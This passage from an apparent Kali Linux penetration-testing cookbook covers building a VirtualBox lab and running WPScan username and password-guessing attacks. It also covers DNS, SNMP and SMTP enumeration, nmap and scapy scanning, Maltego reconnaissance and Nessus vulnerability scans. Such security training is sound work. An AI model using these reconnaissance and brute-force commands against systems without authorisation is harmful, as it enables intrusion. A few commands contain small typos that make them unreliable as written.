select our operating system and set both the memory and hard drive size. Later, we selected our ISO file and then inserted the ISO into our virtual CD/DVD drive. Finally, we started the virtual environment so that our operating system could be installed.

Throughout the rest of this chapter, we will be using VirtualBox as our tool of choice to set up our various environments.

53

![](images/00053.jpeg)

Advanced Testing Lab

There's more...

We will be performing tasks on our hosts that may cause them to become unstable or even fail to run. VirtualBox provides us with an excellent tool for making a copy of our virtual environment:

1.   From the main screen, left-click on the virtual server you would like to clone.

2.   Right-click on the virtual server you would like to clone and press theClone...
             menu option:

3.   On the clone screen, give your new virtual server a name.

54

![](images/00054.jpeg)

Chapter 3

4.   Click onNext,and on the following screen, choose between creating aLinked clone
             or aFull clone, as shown in the following screenshot:

     Full Clone: In a full clone, an exact independent replica of the virtual
              machine is created.

     Linked Clone: In a linked clone, a snapshot is taken and the clone is
              created. However, the linked clone is dependent on the original file in
              order to function. This can degrade the performance of the linked clone.

55

![](images/00055.jpeg)

Advanced Testing Lab

5.   Click onClone and wait for the virtual machine to clone:

Downloading Windows Targets

For now and the foreseeable future, Microsoft Windows is the operating system of choice for many individuals and enterprises.

Luckily, Microsoft provides a way for us to get test operating systems.

Getting ready

A connection to the Internet or an internal network is required to complete this module.

How to do it...

The steps for downloading Windows Targets are as follows:

1.   Open a web browser and navigate to Microsoft Technet athttp://technet.
 microsoft.com/en-us/ms376608.

56

![](images/00056.jpeg)

Chapter 3

2.   Once at the website, on the right-hand side of the screen, click on the
             Downloads link:

3.   From theDownloadmenu option, chooseEvaluate new products:

57

![](images/00057.jpeg)

Advanced Testing Lab

4.   On the next screen, you have several options on how you select your downloads

depending on the product you wish to test. The recommendation is to select Windows Server 2012, Windows 8, and Windows 7:

5.   Once you have downloaded your ISO, follow the instructions in theGetting
 comfortable with VirtualBox recipe of this chapter.

Downloading Linux Targets

For most web facing server deployments, Linux is the operating system of choice. Its relatively low cost (free in many instances) when compared to Windows operating systems makes it ideal for most Cloud, PAAS, and server environments.

In this recipe, we will examine how to download a variety of Linux distributions.

Getting ready

A connection to the Internet or an internal network is required to complete this module.

58

![](images/00058.jpeg)

Chapter 3

How to do it...

The steps for downloading Linux Targets are as follows:

1.   Open a web browser and navigate to Distro Watch athttp://www.distrowatch.
 com.

2.   Once at the website, you will be presented with a listing of well over 100 Linux

distributions. It is advisable to at a bare minimum select more than one distribution including the popular ones (CentOS, Ubuntu, Fedora, and Debian). The page will look like the following screenshot:

3.   Once you have downloaded your ISO, follow the instructions in theGetting
 comfortable with VirtualBox recipe of this chapter.

Attacking WordPress and other applications

More and more businesses today utilizeSAAS(Software as a Service) tools in their daily

business. For example, it is not uncommon for a business to use WordPress as its website's content management system or Drupal for its intranet. Being able to locate vulnerabilities in these applications can prove extremely valuable.

One great resource for gathering applications to test against is Turnkey Linux (http://www. turnkeylinux.org). In this recipe, we will download the popular WordPress Turnkey Linux distribution.

59

![](images/00059.jpeg)

Advanced Testing Lab

Getting ready

A connection to the Internet or an internal network is required to complete this module.

How to do it...

The steps for attacking a WordPress application are as follows:

1.   Open your web browser and visit the Turnkey Linux website athttp://www.
              turnkeylinux.org. The homepage will look like the following screenshot:

60

![](images/00060.jpeg)

Chapter 3

2.   There are many applications listed here, and I would recommend trying them all
 so that you can find vulnerabilities and test your skills against these applications;
              however, for this recipe, we will examine WordPress. In theInstant Search box,
 typeWordPress:

61

![](images/00061.jpeg)

Advanced Testing Lab

3.   On the WordPress download page, select the ISO image and once the download

completes, follow the instructions in theGetting comfortable with VirtualBox recipe to install the Turnkey Linux WordPress virtual machine:

There's more...

Now that we have our WordPress Virtual Machine loaded, we can use WPScan to attack it. WPScan is a blackbox WordPress Security Scanner that allows a user to find vulnerabilities in a WordPress installation.

WPScan takes several arguments and they include:

             -u < target domain name or url>: Theu argument allows you to specify a domain

name to target

             -f: Thef argument allows you to force a check to see if WordPress is installed or not

             -e [options]: Thee argument allows you to set enumeration

Let's begin the process of using WPScan.

Ensure that both your WordPress Virtual Machine and Kali Linux Virtual Machine are started with theVirtualBox Host Only Adapter network
setting used.

1.   From the Kali Linux Virtual Machine, launch the WPScan help file:

wpscan  - h

62

![](images/00062.jpeg)

Chapter 3

The page will look like the following screenshot:

2.   Let's run a basic WPScan against our WordPress Virtual Machine. In this case, our
 target's IP address is 192.168.56.102:

Wpscan  -u  192.168.56.102

3.   Now, let's practice enumerating the username list by running the following command:

wpscan  -u  192.186.56.102  -e u vp

63

![](images/00063.jpeg)

Advanced Testing Lab

The page will look like the following screenshot:

4.   Finally, we can supply a wordlist to WPScan by issuing the-wordlist  <path to
              file> option:

wpscan  -u  192.168.56.102  -e u  --wordlist  /root/wordlist.txt

64

![](images/00064.jpeg)

Chapter 3

The page will look like the following screenshot:

5.   That's it! We have successfully retrieved the password from the
              Wordpress installation.

65

![](images/00004.jpeg)

4

Information Gathering

In this chapter, we will cover:

    Service enumeration

    Determining network range
    Identifying active machines
    Finding open ports

    Operating system fingerprinting
    Service fingerprinting

    Threat assessment with Maltego
    Mapping the network

Introduction

One of the most important stages of an attack is information gathering. To be able to launch an attack, we need to gather basic information about our target. So, the more information we get, the higher the probability of a successful attack.

I also want to emphasize an important aspect of this stage, and it's the documentation.

The latest Kali release available at the time of writing this book includes a few tools to help us collate and organize the data from the target, allowing us to get a better reconnaissance. Tools such as Maltego CaseFile and KeepNote are examples of it. ![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00065.jpeg)

Information Gathering

Service enumeration

In this recipe, we will perform a few service enumeration tricks.Enumerationis a process that allows us to gather information from a network. We will examineDNS enumerationandSNMP enumeration techniques. DNS enumeration is the process of locating all DNS servers and
DNS entries for an organization. DNS enumeration will allow us to gather critical information
about the organization such as usernames, computer names, IP addresses, and so on. To
achieve this task, we will use DNSenum. For SNMP enumeration, we will use a tool called
SnmpEnum. SnmpEnum is a powerful SNMP enumeration tool that allows users to analyze
SNMP traffic on a network.

How to do it...

Let's start by examining the DNS enumeration:

1.   We will utilize DNSenum for DNS enumeration. To start a DNS enumeration,
 open the Gnome terminal and enter the following command:

cd  /usr/bin

./dnsenum  --enum adomainnameontheinternet.com

Please do not run this tool against a public website that is not
your own and is not on your own servers. In this case, we used
adomainnameontheinternet.com as an example and
you should replace this with your target. Be careful!

2.   We should get an output with information like host, name server(s), mail server(s),
 and if we are lucky, a zone transfer:

68

![](images/00066.jpeg)

Chapter 4

3.   There are some additional options we can run using DNSenum and they include
 the following:

             -- threads  [number] allows you to set how many processes will run

at once

             -r allows you to enable recursive lookups

             -d allows you to set the time delay in seconds between WHOIS requests

             -o allows us to specify the output location

             -w allows us to enable the WHOIS queries

For more information on WHOIS, please visit the following URL:

http://en.wikipedia.org/wiki/Whois

69

![](images/00067.jpeg)

Information Gathering

4\.               Another command we can use to examine a Windows host issnmpwalk. Snmpwalk
              is an SNMP application that uses SNMP GETNEXT requests to query a network entity
              for a tree of information. From the command line, issue the following command:

snmpwalk  -c public  192.168.10.200  -v  2c

5\. We can also enumerate the installed software:

snmpwalk  -c public  192.168.10.200  -v  1  | grep hrSWInstalledName

HOST-RESOURCES-MIB::hrSWInstalledName.1  = STRING: "VMware Tools"

HOST-RESOURCES-MIB::hrSWInstalledName.2  = STRING: "WebFldrs"

6\.               And also the open TCP ports using the same tool:

snmpwalk  -c public  192.168.10.200  -v  1  | grep tcpConnState  | cut  -d"."  -f6  | sort  -nu

21

25
80

443

7.              Another utility to get information via SNMP protocols issnmpcheck:

cd  /usr/bin

snmpcheck  -t  192.168.10.200

8\.               To perform a domain scan with fierce—a tool that tries multiple techniques to
              find all the IP addresses and hostnames used by a target—we can issue the
 following command:

cd  /usr/bin

fierce  -dns adomainnameontheinternet.com

Please do not run this tool against a public website that is not your own and is not on your own servers. In this case, we usedadomainnameontheinternet.com as an example and you should replace this with your target. Be careful!

9.              To perform the same operation, but with a supplied word list, type the

following command:

fierce  -dns adomainnameontheinternet.com  -wordlist hosts.txt  -file  /tmp/output.txt

70

![](images/00068.jpeg)

Chapter 4

10\. To start an SMTP enumeration of the users on an SMTP server, enter the
 following command:

smtp-user-enum  -M VRFY  -U  /tmp/users.txt  -t  192.168.10.200

11\. With the results obtained, we can now proceed to document it.

Determining network range

With the gathered information obtained by following the previous recipe of this chapter, we can now focus on determining the IP addresses range from the target network. In this recipe, we will explore the tools needed to achieve it.

How to do it...

Let's begin the process of determining the network range by opening a terminal window:

1.   Open a new terminal window and issue the following command:

dmitry  -wnspb targethost.com  -o  /root/Desktop/dmitry-result

2.   When finished, we should now have a text document on the desktop with filename
             dmitry-result.txt, filled with information gathered from the target:

71

![](images/00069.jpeg)

Information Gathering

3.              To issue an ICMP netmask request, type the following command:

netmask  -s targethost.com

4. Using scapy, we can issue a multiparallel traceroute. To start it, type the

following command:

scapy

5.              With scapy started, we can now enter the following function:

ans,unans=sr(IP(dst="www.targethost.com/30", ttl=(1,6))/TCP())

6.              To display the result in a table, we issue the following function:

ans.make_table( lambda  (s,r):  (s.dst, s.ttl, r.src)  )

The output is shown as follows:

216.27.130.162              216.27.130.163              216.27.130.164  216.27.130.165

1  192.168.10.1              192.168.10.1              192.168.10.1              192.168.10.1

2  51.37.219.254              51.37.219.254              51.37.219.254              51.37.219.254

3  223.243.4.254              223.243.4.254              223.243.4.254              223.243.4.254

4  223.243.2.6              223.243.2.6              223.243.2.6              223.243.2.6

5  192.251.254.1              192.251.251.80              192.251.254.1              192.251.251.80

7.              To get a TCP traceroute with scapy, we type the following function:

res,unans=traceroute(["www.google.com","www.Kali-

linux.org","www.targethost.com"],dport=[80,443],maxttl=20, retry=-2)

8\.               To display a graph representation of the result, we simply issue the following function:

res.graph()

9.   To save the graph, just type the following function:

res.graph(target=">  /tmp/graph.svg")

10\. We can also have a 3D representation of the graph. This is done by entering the
              following function:

res.trace3D()

72

![](images/00070.jpeg)

Chapter 4

11\. To exit scapy, type the following function:

exit()

12\. With the results obtained, we can now proceed to document it.

How it works...

In step 1, we usedmitryto obtain information from the target. The option-wnspb allows us
to perform a WHOIS lookup on the domain name, retrieve theNetcraft.com information,
perform a search for possible subdomains, and a TCP port scan. The option-o allows us
to save the result in a text document. In step 3, we make a simple ICMP netmask request
with the-s option to output the IP address and netmask. Next, we used scapy to issue a
multiparallel traceroute at the target host, displaying the result in a table presentation. In step
7, we performed a TCP traceroute of various hosts on ports80and443, and we set the max
TTL to20 to stop the process. With the result obtained, we created a graph representation of
it, saved it in a temporary directory, and also created a 3D representation of the same result.
Finally, we exit scapy.

Identifying active machines

Before attempting a pentest, we first need to identify the active machines that are on the target network range.

A simple way would be by performing aping on the target network. Of course, this can be rejected or known by a host, and we don't want that.

How to do it...

Let's begin the process of locating active machines by opening a terminal window:

1.   Using Nmap we can find if a host is up or not, shown as follows:

nmap  -sP  216.27.130.162

Starting Nmap  5.61TEST4  ( http://nmap.org  ) at  2012-04-27 23:30 CDT

Nmap scan report for test-target.net  (216.27.130.162) Host is up  (0.00058s latency).

Nmap done:  1 IP address  (1 host up) scanned in  0.06 seconds

73

![](images/00071.jpeg)

Information Gathering

2.   We can also use Nping (Nmap suite), which gives us a more detailed view:

nping  --echo-client "public" echo.nmap.org

3.   We can also send some hex data to a specified port:

nping  -tcp  -p  445  -data AF56A43D  216.27.130.162

Finding open ports

With the knowledge of the victim's network range and the active machines, we'll proceed
with the port scanning process to retrieve the open TCP and UDP ports and access points.

Getting ready

The Apache web server must be started in order to complete this recipe.

74

![](images/00072.jpeg)

Chapter 4

How to do it...

Let's begin the process of finding the open ports by opening a terminal window:

1.   To begin, launch a terminal window and enter the following command:

nmap  192.168.56.101

75

![](images/00073.jpeg)

Information Gathering

2.   We can also explicitly specify the ports to scan (in this case, we are specifying
 1000 ports):

nmap  -p  1-1000  192.168.56.101

3.   Or specify Nmap to scan all the organization's network on TCP port22:
             nmap  -p  22  192.168.56.*

76

![](images/00074.jpeg)

Chapter 4

4.   Or output the result to a specified format:

nmap  -p  22  192.168.10.*  -oG  /tmp/nmap-targethost-tcp445.txt

How it works…

In this recipe, we used Nmap to scan target hosts on our network to determine what ports are open.

There's more...

Nmap has a GUI version called Zenmap, which can be invoked by issuing the commandzenmapat the terminal window or by going toApplications|Kali Linux|Information Gathering|Network Scanners|zenmap.

Operating system fingerprinting

At this point of the information gathering process, we should now have documented a list of IP addresses, active machines, and open ports identified from the target organization. The next step in the process is determining the running operating system of the active machines in order to know the type of systems we're pentesting.

77

![](images/00075.jpeg)

Information Gathering

Getting ready

A Wireshark capture file is needed in order to complete step 2 of this recipe.

How to do it...

Let's begin the process of OS fingerprinting from a terminal window:

1.   Using Nmap, we issue the following command with the-O option to enable the OS
 detection feature:

nmap  -O  192.168.56.102

2.   Usep0f to analyze a Wireshark capture file:

p0f  -s  /tmp/targethost.pcap  -o p0f-result.log  -l

p0f  - passive os fingerprinting utility, version  2.0.8

(C) M. Zalewski  <lcamtuf@dione.cc>, W. Stearns

78

![](images/00076.jpeg)

Chapter 4

<wstearns@pobox.com>

p0f: listening  (SYN) on 'targethost.pcap',  230 sigs  (16 generic), rule: 'all'.

[+] End of input file.

Service fingerprinting

Determining the services running on specific ports will ensure a successful pentest on the

target network. It will also remove any doubts left resulting from the OS fingerprinting process.

How to do it...

Let's begin the process of service fingerprinting by opening a terminal window:
 1. Open a terminal window and issue the following command:

nmap  -sV  192.168.10.200

Starting Nmap  5.61TEST4  ( http://nmap.org  ) at  2012-03-28 05:10 CDT

Interesting ports on  192.168.10.200:
Not shown:  1665 closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd  5.0

25/tcp open smtp Microsoft ESMTP  5.0.2195.6713

80/tcp open http Microsoft IIS webserver  5.0

119/tcp open nntp Microsoft NNTP Service  5.0.2195.6702 (posting ok)

135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn

443/tcp open https?

445/tcp open microsoft-ds Microsoft Windows  2000 microsoft-ds 1025/tcp open mstask Microsoft mstask

1026/tcp open msrpc Microsoft Windows RPC 1027/tcp open msrpc Microsoft Windows RPC 1755/tcp open wms?

3372/tcp open msdtc?

6666/tcp open nsunicast Microsoft Windows Media Unicast Service  (nsum.exe)

79

![](images/00077.jpeg)

Information Gathering

MAC Address:  00:50:56:C6:00:01  (VMware)
Service Info: Host: DC; OS: Windows

Nmap finished:  1 IP address  (1 host up) scanned in  63.311 seconds

2.   Usingamap, we can also identify the application running on a specific port or a range
 of ports, as shown in the following example:

amap  -bq  192.168.10.200  200-300

amap v5.4  (www.thc.org/thc-amap) started at  2012-03-28 06:05:30  - MAPPING mode

Protocol on  127.0.0.1:212/tcp matches ssh  - banner: SSH-2.0-
OpenSSH_3.9p1\n

Protocol on  127.0.0.1:212/tcp matches ssh-openssh  - banner: SSH-2.0-OpenSSH_3.9p1\n

amap v5.0 finished at  2005-07-14  23:02:11

Threat assessment with Maltego

In this recipe, we'll begin with the use of a special Kali edition of Maltego, which will aid us
in the information gathering phase by representing the information obtained in an easy to
understand format. Maltego is an open source threat assessment tool that is designed to
demonstrate the complexity and severity of a single point of failure on a network. It has the
ability to aggregate information from both internal and external sources to provide a clear
threat picture.

Getting ready

An account is required in order to use Maltego. To register for an account, go tohttps://www.paterva.com/web6/community/.

How to do it...

Let's begin the recipe by launching Maltego:

1.   Launch Maltego by going toApplications|Kali Linux|Information Gathering |
             OSINT Analysis|maltego. The page will look like the following screenshot:

80

![](images/00078.jpeg)

Chapter 4

2.   Click onNext on the startup wizard to enter the login details:

81

![](images/00079.jpeg)

Information Gathering

3.   Click onNextto validate our login credentials. When validated, click on theNext
             button to proceed.

4.   Select the transform seed settings and click onNext:

5.   The wizard will perform several operations before continuing to the next screen.

When done, selectOpen a blank graph and let me play aroundand click onFinish:

82

![](images/00080.jpeg)

Chapter 4

6.   To begin with, drag-and-drop theDomainentity from the componentPalette to the
             New Graph document:

83

![](images/00081.jpeg)

Information Gathering

7.   Set the domain name target by clicking on the createdDomain entity and editing the
             Domain Nameproperty located on theProperty View:

8.   Once the target is set, we can start gathering the information. To begin with,
 right-click on the createdDomainentity and selectRun Transform to display
 the available options:

84

![](images/00082.jpeg)

Chapter 4

9.   We can choose to find the DNS names, perform a WHOIS, get the e-mail
 addresses, and so on, or we can also choose to run all the transforms as
 shown in the following screenshot:

10\. We can get even more information by performing the same operation with a linked
              child node, and so on until we get all the information we want.

How it works...

In this recipe, we used Maltego to map the network. Maltego is an open source tool used for information gathering and forensics which was created by Paterva. We began the recipe by completing the setup wizard. Next, we used theDomain entity by dragging it into our graph. Finally, we concluded by allowing Maltego to complete our graph by checking various sources to complete the task. This makes Maltego highly useful because we are able to utilize this automation to quickly gather information on our target, such as gathering e-mail addresses, servers, performing WHOIS lookups, and so on.

The Community Edition only allows us to use 75 transforms as part of our information gathering. The full version of Maltego currently costs $650\.

85

![](images/00083.jpeg)

Information Gathering

There's more...

Activating and deactivating transforms is done through theTransform Manager window under theManage ribbon tab:

To be able to use several transformations, a disclaimer must be accepted first.

Mapping the network

With the information gained from the earlier recipes, we can now proceed to create the
blueprint of the organization's network. In this final recipe of the chapter, we will see how
to visually compile and organize the information obtained using Maltego CaseFile.

CaseFile, as stated on the developer's website, is like Maltego without transforms, but

with tons of features. Most of the features will be demonstrated in theHow to do it… section of this recipe.

86

![](images/00084.jpeg)

Chapter 4

How to do it...

Let's begin the recipe by launching CaseFile:

1.   Launch CaseFile by going toApplications|Kali Linux|Reporting Tools|Evidence
 Management|casefile.

2.   To create a new graph, click onNew in CaseFile's application menu:

87

![](images/00085.jpeg)

Information Gathering

3.   Just as with Maltego, we drag-and-drop each entity from the componentPalette
             into the graph document. Let's start by dragging theDomain entity and changing
              theDomain Name property:

4.   To add a note, hover your mouse pointer over the entity and double-click on the
 note icon:

88

![](images/00086.jpeg)

Chapter 4

5.   Let's drag another entity to record the DNS information from the target:

89

![](images/00087.jpeg)

Information Gathering

6.   To link entities, just drag a line from one entity into another:

7.   Customize the properties of the link as needed:

90

![](images/00088.jpeg)

Chapter 4

8.   Repeat steps 5, 6, and 7 to add more information to the graph about the
 organization's network:

9.   Finally, we save the information graph. The graph document can be opened and
 edited at a later time if we feel the need to do so, like in situations when we have
 more information from the acquired target.

How it works...

In this recipe, we used Maltego CaseFile to map the network. CaseFile is a visual intelligence
application that we used to determine the relationships and real-world links between
hundreds of different types of information. It is primarily an offline intelligence, meaning this
is a manual process. We began the recipe by launching CaseFile and creating a new graph.
Next, we used the knowledge we had gathered or known about the network and began adding
components to the graph to showcase its setup. We concluded the recipe by saving the graph.

91

![](images/00089.jpeg)

Information Gathering

There's more...

We can also encrypt the graph document in order to keep it safe from public eyes. To encrypt
the graph, when saving, check theEncrypt (AES-128) checkbox and provide a password.

92

5

Vulnerability
Assessment

In this chapter, we will cover:

    Installing, configuring, and starting Nessus
    Nessus - finding local vulnerabilities
    Nessus - finding network vulnerabilities
    Nessus - finding Linux-specific vulnerabilities
    Nessus - finding Windows-specific vulnerabilities
    Installing, configuring, and starting OpenVAS
    OpenVAS - finding local vulnerabilities
    OpenVAS - finding network vulnerabilities
    OpenVAS - finding Linux-specific vulnerabilities
    OpenVAS - finding Windows-specific vulnerabilities

Introduction

Scanning and identifying vulnerabilities on our targets is often considered one of the more tedious tasks by most penetration testers and ethical hackers. However, it's one of the most important. This should be considered your homework phase. Just like in school, the homework and quizzes are designed so that you can show mastery for your exam.

Vulnerability identification allows you to do your homework. You will learn about what

vulnerabilities your target is susceptible to so you can make a more polished set of attacks.

In essence, if the attack itself is the exam, then vulnerability identification allows you a chance to prepare. ![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00090.jpeg)

Vulnerability Assessment

Both Nessus and OpenVAS have similar sets of vulnerabilities that they can scan for on a target host. These vulnerabilities include:

    Linux vulnerabilities

    Windows vulnerabilities
    Local security checks

    Network service vulnerabilities

Installing, configuring, and starting Nessus

In this recipe, we will install, configure, and start Nessus. Nessus depends on vulnerability checks in the form of feeds in order to locate vulnerabilities on our chosen target. Nessus comes in two flavors of feeds: Home and Professional.

    Home Feed: The Home Feed is for noncommercial/personal usage. Using Nessus in
              a professional environment for any reason requires the use of the Professional Feed.

    Professional Feed: The Professional Feed is for commercial usage. It includes

support and additional features such as unlimited concurrent connections and so on. If you are a consultant and are performing tests for a client, the Professional Feed is the one for you.

For our recipe, we will assume you are utilizing the Home Feed.

Getting ready

The following requirements need to be fulfilled:

    A connection to the Internet is required to complete this recipe    A valid license for the Nessus Home Feed

How to do it...

Let's begin the installation, configuring, and starting of Nessus by opening a terminal window:

1.   Open the IceWeasel web browser and navigate to the following URL:http://www.
 tenable.com/products/nessus/select-your-operating-system.

2.   On the left-hand side of the screen, underDownload Nessus, selectLinux and then
 (at least as of this writing) chooseNessus-5.2.1-debian6_amd64.deb.

94

![](images/00091.jpeg)

Chapter 5

3.   Download the file to your local root directory.

95

![](images/00092.jpeg)

Vulnerability Assessment

4.   Open a terminal window.

5.   Execute the following command to install Nessus:

dpkg  -i "Nessus-5.2.1-debian6_i386.deb"

The output of the preceding command will be as follows:

6.   Nessus will be installed under the/opt/nessus directory.

7.   Once the installation completes, you can run Nessus by typing the
              following command:

/etc/init.d/nessusd start

Before you can begin using Nessus, you must have a registration code. You can get more information on how to do this from the followingThere's more... section.

8.   Enable your Nessus install by executing the following command:

/opt/nessus/bin/nessus-fetch  --register XXXX-XXXX-XXXX-XXXX-
XXXX

In this step, we will also grab the latest plugins fromhttp://plugins.nessus.
org.

Depending on your Internet connection, this may take a minute or two.

96

![](images/00093.jpeg)

Chapter 5

9.   Now enter the following command in the terminal:

/opt/nessus/sbin/nessus-adduser

10\. At the login prompt, enter the login name of the user.

11\. Enter the password twice.

12\. Answer asY (Yes) to make this user an administrator.

This only needs to be performed on your first use.

13\. Once complete, you can run Nessus by typing the following command (it won't work
              without a user account):

/etc/init.d/nessusd start

14\. Log in to Nessus athttps://127.0.0.1:8834.

If you are going to use Nessus, remember to do so either from an

installed version of Kali Linux on your local machine or from a virtual

machine. The reason for this is that Nessus activates itself based upon the machine that it's using. If you install to a USB key, you will have to reactivate your feed every time you restart the machine.

How it works...

In this recipe, we began by opening a terminal window and installing Nessus via the repository. We later started Nessus and installed our feed certificate in order to utilize the program.

There's more...

In order to register your copy of Nessus, you must have a valid license which can be obtained fromhttp://www.tenable.com/products/nessus/nessus-homefeed. Also, Nessus runs as Flash inside the browser, so you may have to install the Flash plugin for Firefox the first time you start the program. If you run into an issue using Flash, go towww.get.adobe. com/flashplayer for more information.

97

![](images/00094.jpeg)

Vulnerability Assessment

Nessus - finding local vulnerabilities

Now that we have Nessus installed and configured, we will be able to begin testing of our first
set of vulnerabilities. Nessus allows us to attack a wide range of vulnerabilities depending
on our feed, and we will confine our list of assessing the vulnerabilities of our target to those
specific to the type of information we seek to gain from the assessment. In this recipe, we will
begin by finding local vulnerabilities. These are vulnerabilities specific to the operating system
we are using.

Getting ready

To complete this recipe, you will be testing your local system (Kali Linux).

How to do it...

Let's begin the process of finding local vulnerabilities with Nessus by opening the Mozilla Firefox web browser:

1.   Log in to Nessus athttps://127.0.0.1:8834.

2.   Go toPolicies.

3.   Click onNew Policy.

98

![](images/00095.jpeg)

Chapter 5

4.   On theGeneral Settings tab, perform the following tasks:

1.   UnderSettings Type, chooseBasic.

2.   Enter a name for your scan. We choseLocal Vulnerability
              Assessment, but you can choose any name you wish.

3.   Visibility has two options:

     Shared: Other users have the ability to utilize this scan     Private: This scan can only be utilized by you

4.   Take the defaults on the rest of the items on the page.

5.   Click onUpdate.

5.   On thePluginstab, selectDisable All and select the following specific vulnerabilities:
                  Ubuntu Local Security Checks

     Default Unix Accounts

6.   Click onUpdate to save your new policy.

7.   On the main menu, click on theScan Queue menu option.

99

![](images/00096.jpeg)

Vulnerability Assessment

8.   Click on theNew Scan button and perform the following tasks:

1.   Enter a name for your scan. This is useful if you will be running more
 than one scan at a time. It's a way to differentiate the scans that are
 currently running.

2.   Enter the type of scan:

     Run Now: Enabled by default, this option will run this scan immediately     Scheduled: Allows you to choose the date and time to run the scan     Template: Allows you to set this scan as a template

3.   Choose a scan policy. In this case, theLocal Vulnerabilities Assessment
             policy we created earlier in the recipe.

4.   Choose your targets considering the following points:
                  Targets must be entered one per line

     You can also enter ranges of targets on each line

5.   You may also upload a target's file (if you have one) or selectAdd Target
              IP Address.

9.   Click onRun Scan:

100

![](images/00097.jpeg)

Chapter 5

10\. You will get a confirmation and your test will complete (depending on how many
 targets are selected and the number of tests performed).

11\. Once completed, you will receive a report.

12\. Double-click on the report to analyze the following points (on theResults tab):
                  Each target in which a vulnerability is found will be listed

     Double-click on the IP address to see the ports and issues on each port     Click on the number under the column to get the list of specific
              issues/vulnerabilities found

     The vulnerabilities will be listed in detail

13\. Click onDownload Reportfrom theReports main menu.

Nessus - finding network vulnerabilities

Nessus allows us to attack a wide range of vulnerabilities depending on our feed, and we will confine our list of assessing the vulnerabilities of our target to those specific to the type of
information we seek to gain from the assessment. In this recipe, we will configure Nessus to find network vulnerabilities on our targets. These are vulnerabilities specific to the machines or protocols on our network.

Getting ready

To complete this recipe, you will need a virtual machine(s) to test against:
                 Windows XP

    Windows 7

    Metasploitable 2.0

    A network firewall or router
    Any other flavor of Linux

101

![](images/00098.jpeg)

Vulnerability Assessment

How to do it...

Let's begin the process of finding network vulnerabilities with Nessus by opening the Mozilla Firefox web browser:

1.   Log in to Nessus athttps://127.0.0.1:8834.

2.   Go toPolicies.

3.   Click onAdd Policy.

4.   On theGeneral tab, perform the following tasks:

1.   Enter a name for your scan. We choseInternal Network Scan,
              but you can choose any name you wish.

2.   Visibility has two options:

     Shared: Other users have the ability to utilize this scan     Private: This scan can only be utilized by you

3.   Take the defaults on the rest of the items on the page.

4.   Click onUpdate.

102

![](images/00099.jpeg)

Chapter 5

5. On thePluginstab, click onDisable All and select the following specific

vulnerabilities:

     CISCO
     DNS

     Default Unix Accounts
     FTP

     Firewalls

     Gain a shell remotely
     General

     Netware

     Peer-To-Peer File Sharing
     Policy Compliance
     Port Scanners
     SCADA

     SMTP Problems
     SNMP

     Service Detection
     Settings

103

![](images/00100.jpeg)

Vulnerability Assessment

6.              Click onUpdate to save your new policy.

7.              On the main menu, click on theScan Queue menu option.

8.              Click on theNew Scan button and perform the following tasks:

1.   Enter a name for your scan. This is useful if you will be running more
 than one scan at a time. It's a way to differentiate the scans that are
 currently running.

2.   Enter the type of scan:

     Run Now: Enabled by default, this option will execute the scan
              immediately

     Scheduled: Allows you to select the date and time the scan is to
              be executed

     Template: Allows you to set this scan as a template

3.   Choose a scan policy. In this case, theInternal Network Scan policy
 we created earlier in the recipe.

4.   Choose your targets considering the following points:
                  Targets must be entered one per line

     You can also enter ranges of targets on each line

5.   You may also upload a target's file (if you have one) or selectAdd Target
              IP Address.

9.              Click onRun Scan:

104

![](images/00101.jpeg)

Chapter 5

10\. You will get a confirmation and your test will complete (depending on how many
 targets are selected and the number of tests performed).

11\. Once completed, you will receive a report inside of theResults tab.

12\. Double-click on the report to analyze the following points:

     Each target in which a vulnerability is found will be listed

     Double-click on the IP address to see the ports and issues on each port     Click on the number under the column to get the list of specific issues/
              vulnerabilities found

     The vulnerabilities will be listed in detail

13\. Click onDownload Reportfrom theReports main menu.

Nessus - finding Linux-specific vulnerabilities

In this recipe, we will explore how to find Linux-specific vulnerabilities using Nessus.
These are vulnerabilities specific to the machines that run Linux on our network.

Getting ready

To complete this recipe, you will need a virtual machine(s) to test against:
                 Metasploitable 2.0

    Any other flavor of Linux

105

![](images/00102.jpeg)

Vulnerability Assessment

How to do it...

Let's begin the process of finding Linux-specific vulnerabilities with Nessus by opening the Mozilla Firefox web browser:

1.   Log in to Nessus athttp://127.0.0.1:8834.

2.   Go toPolicies.

3.   Click onAdd Policy:

4.   On theGeneral Settings tab, perform the following tasks:

1.   Enter a name for your scan. We choseLinux Vulnerability Scan, but you can
 choose any name you wish.

2.   Visibility has two options:

     Shared: Other users have the ability to utilize this scan     Private: This scan can only be utilized by you

3.   Take the defaults on the rest of the items on the page.

106

![](images/00037.jpeg)

Chapter 5

5\.               On thePluginstab, click onDisable All and enter the following specific vulnerabilities.
              This list is going to be rather long as we are scanning for services that may be running
 on our Linux target:

             Backdoors

             Brute Force Attacks

             CentOS Local Security Checks

             DNS

             Debian Local Security Checks

             Default Unix Accounts

             Denial of Service

             FTP

             Fedora Local Security Checks

             Firewalls

             FreeBSD Local Security Checks

             Gain a shell remotely

             General

             Gentoo Local Security Checks

             HP-UX Local Security Checks

             Mandriva Local Security Checks

             Misc

             Port Scanners

             Red Hat Local Security Checks

             SMTP Problems

             SNMP

             Scientific Linux Local Security Checks

             Slackware Local Security Checks

             Solaris Local Security Checks

107

![](images/00103.jpeg)

Vulnerability Assessment

     SuSE Local Security Checks     Ubuntu Local Security Checks     Web Servers

6.   Click onUpdate to save your new policy.

7.   On the main menu, click on theScan Queue menu option.

8.   Press theNew Scan button and perform the following tasks:

1.   Enter a name for your scan. This is useful if you will be running more
 than one scan at a time. It's a way to differentiate the scans that are
 currently running.

2.   Enter the type of scan:

     Run Now: Enabled by default, this option will cause the scan to
              execute immediately

     Scheduled: Allows you to choose the date and time the scan
              should execute

     Template: Allows you to set this scan as a template

3.   Choose a scan policy. In this case, theLinux Vulnerabilities Scan policy
 we created earlier in the recipe.

108

![](images/00104.jpeg)

Chapter 5

4.   Choose your targets considering the following points:
                  Targets must be entered one per line

     You can also enter ranges of targets on each line

     Upload a target's file (if you have one) or selectAdd Target IP Address

9.   Click onLaunch Scan:

10\. You will get a confirmation and your test will complete (depending on how many
 targets are selected and the number of tests performed).

11\. Once completed, you will receive a report on theReports tab.

12\. Double-click on the report to analyze the following points:

     Each target in which a vulnerability is found will be listed

     Double-click on the IP address to see ports and issues on each port     Click on the number under the column to get the list of specific
              issues/vulnerabilities found

